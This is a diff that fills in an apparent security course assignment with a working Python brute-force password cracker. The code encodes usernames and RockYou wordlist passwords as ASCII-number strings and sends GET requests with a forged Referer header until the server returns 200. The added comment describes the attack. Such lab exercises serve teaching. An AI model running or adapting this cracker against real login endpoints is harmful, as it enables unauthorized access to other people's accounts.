@@ -14,16 +14,46 @@
 # Python "requests" library. Please specify any other dependencies by adding
 # their installation commands to setup.sh.
 #
-# TODO: briefly describe how this cracker works.
+# Description of the attack: 
+# We mimic the GET request that the server uses for authentication. The GET
+# request is in the form ?pw=PASSWORD&un=USERNAME, where PASSWORD and 
+# USERNAME is encoded in the ASCII number corresponding to the letter with 
+# a dash in between each letter. Also, the server will return a 200 OK if
+# the username and password combination worked. Therefore, we just brute
+# force the username and password combinations from RockYouTop25000 until 
+# either the passwords run out or we get a 200 OK. 
+#
+# Note that the server will reject the authentication request if we did not
+# have the header {"Referer": $MAIN_PAGE_URL}, so we had to add that onto
+# our constructed GET request.
 
 import sys
+import requests
+import random
 
+
+def custom_url_string(original):
+    res = ""
+    for c in original:
+        lol = ord(c)
+        res += "{}-".format(lol)
+    return res[:-1]
 
 # If succesful, returns the cracked password.
 # If unsuccessful, returns None.
 def crack(username, hostname, port):
-    # TODO: implement this.
-    return None
+    un = custom_url_string(username)
+    f = open('data/rockyoupasswords.txt', 'r')
+    for pw in f.readlines():
+        pw = pw.strip('\n')
+        oldpw = pw
+        pw = custom_url_string(pw)
+        url = "http://{}:{}/$0000000000?pw={}&un={}.inbox".format(hostname, port, pw, un)        
+        headers = {"Referer": "http://{}:{}/".format(hostname, port)}
+        r = requests.get(url, headers=headers)
+        if (r.status_code == 200):
+            return oldpw
+            break
 
 
 # Do NOT change anything below (unless you are using Python 2, in which case
